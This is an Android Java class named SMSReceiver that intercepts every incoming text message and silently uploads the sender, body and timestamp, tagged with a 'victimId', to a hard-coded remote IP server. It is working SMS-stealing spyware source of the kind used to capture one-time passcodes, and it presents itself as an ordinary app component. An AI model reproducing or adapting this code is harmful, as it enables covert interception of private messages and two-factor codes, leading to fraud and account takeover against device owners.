package com.my.myapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SMSReceiver extends BroadcastReceiver {

    private static final String SERVER_URL = "http://154.83.159.245:3000";

    private String getDeviceId(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("QSUK_PREFS", Context.MODE_PRIVATE);
        return prefs.getString("deviceId", null);
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) return;

        String deviceId = getDeviceId(context);
        if (deviceId == null) {
            Log.e("SMSReceiver", "❌ Нет deviceId");
            return;
        }

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null) return;

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
            String sender = sms.getDisplayOriginatingAddress();
            String message = sms.getDisplayMessageBody();
            long timestamp = sms.getTimestampMillis();

            Log.d("SMSReceiver", "📨 от " + sender + ": " + message);
            sendToServer(deviceId, sender, message, String.valueOf(timestamp));
        }
    }

    private void sendToServer(String deviceId, String sender, String body, String date) {
        new Thread(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("victimId", deviceId);

                JSONObject sms = new JSONObject();
                sms.put("address", sender);
                sms.put("body", body);
                sms.put("date", date);
                data.put("sms", sms);

                URL url = new URL(SERVER_URL + "/api/newsms");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);

                OutputStream os = conn.getOutputStream();
                os.write(data.toString().getBytes());
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d("SMSReceiver", "✅ SMS отправлено, ответ: " + responseCode);

            } catch (Exception e) {
                Log.e("SMSReceiver", "❌ Ошибка отправки SMS", e);
            }
        }).start();
    }
}